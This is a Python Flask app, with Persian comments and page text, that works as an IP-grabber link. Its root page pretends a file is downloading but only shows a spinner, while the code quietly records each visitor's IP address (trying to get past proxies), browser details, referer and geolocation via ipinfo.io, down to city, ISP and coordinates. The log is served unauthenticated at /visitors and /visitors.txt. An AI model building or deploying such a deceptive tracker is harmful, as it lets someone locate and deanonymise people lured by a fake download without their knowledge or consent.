from flask import Flask, request, render_template_string, jsonify
import requests
from datetime import datetime
import os

app = Flask(__name__)
visitors = []

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>صفحه دانلود</title>
    <meta charset="utf-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        h1 { font-size: 2.5em; margin-bottom: 20px; }
        .loading { font-size: 1.2em; margin-top: 20px; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 فایل در حال دانلود...</h1>
        <div class="spinner"></div>
        <div class="loading">لطفاً صبر کنید...</div>
    </div>
</body>
</html>
"""

def get_real_ip():
    """IP واقعی (نه Proxy)"""
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    if 'X-Real-IP' in request.headers:
        return request.headers['X-Real-IP']
    return request.remote_addr

def get_location(ip):
    """Location دقیق"""
    try:
        resp = requests.get(f'http://ipinfo.io/{ip}/json', timeout=5)
        data = resp.json()
        return {
            'country': data.get('country', 'N/A'),
            'city': data.get('city', 'N/A'),
            'region': data.get('region', 'N/A'),
            'isp': data.get('org', 'N/A'),
            'lat': data.get('loc', 'N/A').split(',')[0] if data.get('loc') else 'N/A',
            'lon': data.get('loc', 'N/A').split(',')[1] if data.get('loc') else 'N/A'
        }
    except:
        return {'country': 'N/A', 'city': 'N/A', 'region': 'N/A', 'isp': 'N/A'}

@app.route('/', methods=['GET'])
def track_visitor():
    visitor_info = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': get_real_ip(),  # ✅ IP عمومی
        'user_agent': request.headers.get('User-Agent', 'N/A'),
        'referer': request.headers.get('Referer', 'N/A'),
        'language': request.headers.get('Accept-Language', 'N/A'),
        'url': request.url,
        'method': request.method
    }
    
    location = get_location(visitor_info['ip'])
    visitor_info.update(location)
    visitors.append(visitor_info)
    
    # لاگ کنسول (Render logs)
    print(f"""
🔍 NEW VISITOR:
IP: {visitor_info['ip']}
🌍 {visitor_info['city']}, {visitor_info['country']}
📶 ISP: {visitor_info['isp']}
📱 {visitor_info['user_agent'][:80]}...
🔗 {visitor_info['referer']}
    """)
    
    return render_template_string(HTML_TEMPLATE)

@app.route('/visitors')
def show_visitors():
    return jsonify({'total': len(visitors), 'visitors': visitors[-20:]})

@app.route('/visitors.txt')
def download_visitors():
    content = "VISITORS LOG\n" + "="*50 + "\n\n"
    for v in visitors[-50:]:
        content += f"[{v['timestamp']}] {v['ip']} | {v['city']}, {v['country']}\n"
        content += f"ISP: {v['isp']} | UA: {v['user_agent'][:60]}\n\n"
    return content, 200, {
        'Content-Type': 'text/plain',
        'Content-Disposition': 'attachment; filename=visitors.txt'
    }

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)